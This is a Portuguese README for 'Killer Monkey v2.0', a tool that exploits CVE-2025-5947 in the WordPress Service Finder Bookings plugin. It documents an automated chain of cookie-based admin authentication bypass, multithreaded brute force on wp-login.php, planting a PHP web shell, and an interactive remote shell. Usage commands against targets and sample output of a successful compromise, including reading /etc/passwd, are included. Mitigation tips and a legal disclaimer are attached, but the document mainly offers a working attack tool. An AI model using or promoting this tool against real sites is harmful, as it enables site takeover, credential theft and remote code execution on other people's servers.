# KILLER MONKEY v2.0 - BloodTeam

## Exploit Scanner para CVE-2025-5947

Ferramenta profissional de segurança para exploração e teste de vulnerabilidades em WordPress, especificamente a falha crítica **CVE-2025-5947** no plugin Service Finder Bookings.

---

## SOBRE A VULNERABILIDADE

### CVE-2025-5947: Falha em Plugin do WordPress Permite Acesso Não Autorizado a Contas de Administrador

**Severidade:** CRÍTICA (CVSS 9.8)

#### O Contexto

O Service Finder Bookings é um plugin amplamente utilizado por empresas e prestadores de serviços para gerenciar reservas e agendamentos online. A ferramenta adiciona funcionalidades avançadas de cadastro, login e gerenciamento de usuários.

Entretanto, versões do plugin até a **6.0 (inclusive)** foram identificadas como vulneráveis a um bypass de autenticação, permitindo a escalação de privilégios.

#### O Problema

O problema está relacionado à forma como o plugin valida o valor do cookie do usuário durante o processo de login, mais especificamente, na função `service_finder_switch_back()`.

Devido à ausência de verificações adequadas, atacantes podem manipular o cookie para se autenticar como qualquer usuário, inclusive administradores.

#### Impacto Crítico

Um invasor pode:

- Obter acesso total ao painel administrativo do WordPress
- Modificar configurações do site e instalar backdoors
- Injetar código malicioso (malware, redirecionamentos ou scripts)
- Comprometer dados de usuários e visitantes
- Implantar shells para execução remota de código (RCE)

#### Exploração Ativa

Relatórios recentes confirmam que a falha já está sendo ativamente explorada por agentes maliciosos em campanhas em massa.

---

## RECURSOS DA FERRAMENTA

- ✓ Detecção automática de WordPress
- ✓ Identificação de versão do WordPress
- ✓ Detecção do plugin Service Finder Bookings
- ✓ Enumeração de endpoints vulneráveis
- ✓ Enumeração de usuários WordPress
- ✓ Exploração de CVE-2025-5947 via manipulação de cookies
- ✓ Bypass de autenticação automático
- ✓ Ataque de força bruta multithreading em /wp-login.php
- ✓ Implantação de shell RCE no servidor
- ✓ Shell interativo para execução de comandos
- ✓ Geração de relatório detalhado em JSON
- ✓ Suporte a wordlist customizada
- ✓ Modo verbose para debugging

---

## INSTALAÇÃO

### Requisitos

- Python 3.7+
- pip (gerenciador de pacotes Python)

### Dependências

```bash
pip install requests urllib3
```

### Download

```bash
git clone https://github.com/luanisaque3/plascov_1.0.git
cd plascov_1.0
chmod +x killer_monkey.py
```

---

## USO BÁSICO

### Execução Simples

```bash
python3 killer_monkey.py https://alvo.com
```

### Com Wordlist Customizada

```bash
python3 killer_monkey.py https://alvo.com -w senhas.txt
```

### Com Múltiplas Threads (mais rápido)

```bash
python3 killer_monkey.py https://alvo.com -t 20
```

### Modo Verbose (mais detalhado)

```bash
python3 killer_monkey.py https://alvo.com -v
```

### Combinado - Opções Completas

```bash
python3 killer_monkey.py https://alvo.com -w senhas.txt -t 15 --timeout 20 -v
```

---

## OPÇÕES DE LINHA DE COMANDO

```
positional arguments:
  target                URL do alvo (ex: https://example.com)

optional arguments:
  -h, --help            Mostra esta ajuda
  -w, --wordlist        Arquivo com lista de senhas (uma por linha)
  -t, --threads         Numero de threads para força bruta (padrao: 10)
  --timeout             Timeout em segundos (padrao: 15)
  -v, --verbose         Modo verbose (mais detalhado)
```

---

## FLUXO DE EXECUÇÃO

### Fase 1: Reconhecimento

1. Verificação se é WordPress
2. Detecção de versão
3. Detecção do plugin Service Finder Bookings
4. Enumeração de endpoints vulneráveis
5. Enumeração de usuários

### Fase 2: Exploração CVE-2025-5947

1. Tentativa de bypass de autenticação via manipulação de cookies
2. Teste de acesso direto a endpoints admin
3. Se sucesso: implantação de shell RCE

### Fase 3: Alternativa - Força Bruta

1. Se CVE-2025-5947 falhar
2. Ataque de força bruta multithreading em /wp-login.php
3. Teste com usuários enumerados + wordlist
4. Se credenciais encontradas: implantação de shell RCE

### Fase 4: Shell Interativo

1. Se RCE implantado com sucesso
2. Oferece shell interativo para execução de comandos
3. Acesso total ao servidor comprometido

### Fase 5: Relatório

1. Geração de relatório detalhado
2. Exportação em formato JSON
3. Sumário visual dos resultados

---

## EXEMPLOS DE USO

### Exemplo 1: Scan Rápido

```bash
python3 killer_monkey.py https://wordpress-site.com
```

**Resultado esperado:**
```
[+] Alvo: https://wordpress-site.com
[+] Timestamp: 2026-06-15 14:30:00
[+] CVE-2025-5947 - Service Finder Bookings Auth Bypass
...
[+] WordPress detectado com sucesso!
[+] Versao WordPress: 6.5
[+] Plugin Service Finder Bookings ENCONTRADO!
[+] Usuario encontrado: admin
[+++] BYPASS CONSEGUIDO COM USUARIO: admin
[+] Shell RCE implantado com sucesso!
```

### Exemplo 2: Com Wordlist

```bash
python3 killer_monkey.py https://wordpress-site.com -w meu_dicionario.txt
```

Onde `meu_dicionario.txt` contém:

```
admin123
senha123
wordpress
password
123456
```

### Exemplo 3: Múltiplas Threads + Verbose

```bash
python3 killer_monkey.py https://wordpress-site.com -t 20 -v
```

---

## ESTRUTURA DO RELATÓRIO GERADO

```json
{
  "timestamp": "2026-06-15T14:30:00.123456",
  "target": "https://wordpress-site.com",
  "scan_type": "CVE-2025-5947 Service Finder Bookings",
  "wordpress_detected": true,
  "wordpress_version": "6.5",
  "vulnerable_plugins": [
    {
      "name": "service-finder-bookings",
      "url": "https://wordpress-site.com/wp-content/plugins/service-finder-bookings/",
      "cve": "CVE-2025-5947",
      "severity": "CRITICA"
    }
  ],
  "vulnerable_endpoints": [
    {
      "path": "/wp-json/sfb/v1/auth/cookie",
      "status": 200
    }
  ],
  "cookie_exploit_success": true,
  "admin_credentials": {
    "method": "cookie_bypass",
    "username": "admin",
    "cookie": "wordpress_logged_in_abcd1234=..."
  },
  "rce_shell_deployed": true,
  "rce_shell_url": "https://wordpress-site.com/wp-content/plugins/mk_shell_123456789.php"
}
```

---

## SHELL INTERATIVO

Após exploração bem-sucedida, você pode usar o shell interativo:

```bash
shell> whoami
www-data

shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

shell> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/bash
...

shell> ls -la /var/www/html/
total 32
drwxr-xr-x  5 www-data www-data 4096 Jun 15 12:00 .
drwxr-xr-x  3 root     root     4096 Jun  1 10:00 ..
-rw-r--r--  1 www-data www-data  419 Jun 15 12:00 index.php
-rw-r--r--  1 www-data www-data 2789 Jun 15 12:00 wp-config.php
...

shell> exit
[*] Fechando shell...
```

---

## MEDIDAS DE MITIGAÇÃO

### Para Administradores de Site

1. **Atualizar o Plugin**
   - Atualize o plugin Service Finder Bookings para a versão mais recente
   - Sempre use versões acima de 6.1 que contém o patch

2. **Desativar Temporariamente**
   - Se não conseguir atualizar imediatamente, desative o plugin
   - Use: Plugins > Plugin Installer > Service Finder Bookings > Desativar

3. **Revisar Logs**
   ```bash
   grep "sfb\|service.finder\|switch_back" /var/log/apache2/access.log
   grep "wordpress_logged_in\|sfb_auth\|sfb_user_cookie" /var/log/apache2/access.log
   ```

4. **Redefinir Credenciais**
   - Trocar todas as senhas de admin
   - Redefinir token de autenticação
   - Desconectar todas as sessões ativas

5. **Camadas Adicionais de Proteção**
   - Implementar WAF (Web Application Firewall)
   - Ativar Autenticação Multifator (MFA)
   - Restringir acesso via IP ao /wp-admin/
   - Implementar rate limiting

6. **Backup e Restore**
   - Fazer backup completo do site
   - Verificar integridade de arquivos
   - Restaurar se houver malware

---

## DISCREPÂNCIAS DE SEGURANÇA CONHECIDAS

- Plugin possui validação inadequada de cookies
- Falta de verificação CSRF em endpoints sensíveis
- Função `service_finder_switch_back()` sem proteção
- Endpoints expostos em `/wp-json/sfb/v1/`

---

## REQUISITOS LEGAIS E ÉTICOS

**AVISO LEGAL IMPORTANTE:**

Esta ferramenta é fornecida **EXCLUSIVAMENTE para fins educacionais e de teste de segurança autorizado**. O uso dessa ferramenta para:

- Accesso não autorizado a sistemas
- Roubo de dados
- Sabotagem
- Qualquer atividade ilegal

É **ILEGAL** e sujeito a consequências criminais.

**Responsabilidades do Usuário:**

- Use apenas em ambientes que você possui ou tem permissão expressa
- Respeite todas as leis e regulamentos aplicáveis
- Obtenha consentimento escrito antes de testar
- Não cause danos a sistemas ou dados
- Documente todas as atividades de teste

**Os criadores desta ferramenta não são responsáveis por uso indevido.**

---

## SUPORTE E DOCUMENTAÇÃO

Para mais informações sobre CVE-2025-5947:

- [NVD - CVE-2025-5947](https://nvd.nist.gov/vuln/detail/CVE-2025-5947)
- [Wordfence Security Blog](https://www.wordfence.com)
- [The Hacker News](https://thehackernews.com)
- [Security Affairs](https://securityaffairs.com)

---

## DESENVOLVEDOR

**ferramenta criada por plascoy**

Parte da suite de segurança BloodTeam

---

## LICENÇA

Uso educacional e de teste autorizado apenas.

---

## CHANGELOG

### v2.0 (15/06/2026)

- Exploração completa de CVE-2025-5947
- Shell interativo RCE
- Relatório JSON detalhado
- Múltiplas threads para força bruta
- Enumeração avançada de endpoints
- Modo verbose melhorado

### v1.0 (Anterior)

- Versão inicial

---

**Última atualização:** 15/06/2026

**Status:** Ativo e Funcional

**Suporte CVE:** CVE-2025-5947 (Service Finder Bookings Authentication Bypass)
